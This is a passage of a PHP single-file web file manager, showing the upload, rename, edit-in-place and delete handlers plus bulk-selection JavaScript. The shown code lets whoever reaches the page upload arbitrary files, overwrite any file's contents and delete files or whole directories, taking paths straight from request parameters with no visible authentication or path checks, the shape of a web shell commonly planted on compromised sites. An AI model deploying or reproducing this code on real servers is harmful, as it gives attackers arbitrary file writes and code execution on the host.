          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($file) . "' onclick=\"return confirm('Delete this file?')\"><i class='fa fa-trash' aria-hidden='true'></i></a>
          </td>
    </tr>
";
        }
        echo "  </tbody>
</table>
</form>";
    } else {
        if (empty($_GET)) {
            echo ("<script>window.location.replace('?p=');</script>");
        }
    }
    if (isset($_GET['upload'])) {
        echo '
    <div class="form-section">
        <h5><i class="fa-solid fa-upload"></i> Upload File</h5>
        <form method="post" enctype="multipart/form-data">
            <div class="mb-3">
                <label class="form-label">Select file to upload:</label>
                <input type="file" class="form-control" name="fileToUpload" id="fileToUpload" required>
            </div>
            <button type="submit" class="btn btn-dark" name="upload"><i class="fa-solid fa-upload"></i> Upload</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';
    }
    if (isset($_GET['r'])) {
        if (!empty($_GET['r']) && isset($_GET['q'])) {
            echo '
    <div class="form-section">
        <h5><i class="fa-sharp fa-regular fa-pen-to-square"></i> Rename</h5>
        <form method="post">
            <div class="mb-3">
                <label class="form-label">New Name:</label>
                <input type="text" class="form-control" name="name" value="' . htmlspecialchars($_GET['r']) . '" required>
            </div>
            <button type="submit" class="btn btn-dark" name="rename"><i class="fa-solid fa-save"></i> Rename</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';
            if (isset($_POST['rename'])) {
                $name = PATH . "/" . $_GET['r'];
                if(rename($name, PATH . "/" . $_POST['name'])) {
                    echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    if (isset($_GET['e'])) {
        if (!empty($_GET['e']) && isset($_GET['q'])) {
            echo '
    <div class="form-section">
        <h5><i class="fa-solid fa-file-pen"></i> Edit File: ' . htmlspecialchars($_GET['e']) . '</h5>
        <form method="post">
            <textarea class="form-control" style="height: 500px; font-family: monospace;" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
            <br>
            <button type="submit" class="btn btn-dark" name="edit"><i class="fa-solid fa-save"></i> Save</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';

    if(isset($_POST['edit'])) {
        $filename = PATH."/".$_GET['e'];
        $data = $_POST['data'];
        $open = fopen($filename,"w");
        if(fwrite($open,$data)) {
            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
        fclose($open);
    }
        }
    }

    if (isset($_POST["upload"])) {
        $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<div class='alert alert-success m-3'>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</div>";
        } else {
            echo "<div class='alert alert-danger m-3'>Sorry, there was an error uploading your file.</div>";
        }

    }
    if (isset($_GET['d']) && isset($_GET['q'])) {
        $name = PATH . "/" . $_GET['d'];
        if (is_file($name)) {
            if(unlink($name)) {
                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        } elseif (is_dir($name)) {
            if(deleteDirectory($name)) {
                echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }
    ?>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>
    
    <script>
        // Bulk Selection Functions
        function updateBulkActions() {
            const checkboxes = document.querySelectorAll('.bulk-checkbox:checked');
            const bulkActions = document.getElementById('bulkActions');
            const selectedCount = document.getElementById('selectedCount');
            const selectAll = document.getElementById('selectAll');
            
            if (checkboxes.length > 0) {
                bulkActions.classList.add('show');
                selectedCount.textContent = checkboxes.length;
            } else {
                bulkActions.classList.remove('show');
            }

            const allCheckboxes = document.querySelectorAll('.bulk-checkbox');
            if (allCheckboxes.length > 0 && checkboxes.length === allCheckboxes.length) {
                selectAll.checked = true;
                selectAll.indeterminate = false;
            } else if (checkboxes.length > 0) {
                selectAll.checked = false;
                selectAll.indeterminate = true;
            } else {
                selectAll.checked = false;
                selectAll.indeterminate = false;
            }
        }

        function toggleSelectAll() {
            const selectAll = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('.bulk-checkbox');
            
            checkboxes.forEach(checkbox => {
                checkbox.checked = selectAll.checked;
            });
            
            updateBulkActions();
        }

        function deselectAll() {
            const selectAll = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('.bulk-checkbox');
            
            selectAll.checked = false;
            checkboxes.forEach(checkbox => {
                checkbox.checked = false;
            });
            
            updateBulkActions();
            hideBulkMoveInput();
        }

        function showBulkMoveInput() {
            document.getElementById('bulkMoveInput').style.display = 'flex';
            document.getElementById('bulkActions').style.display = 'none';
        }

        function hideBulkMoveInput() {
            document.getElementById('bulkMoveInput').style.display = 'none';
            const checkboxes = document.querySelectorAll('.bulk-checkbox:checked');
            if (checkboxes.length > 0) {
                document.getElementById('bulkActions').style.display = 'flex';
            }
        }
    </script>
</body>

</html>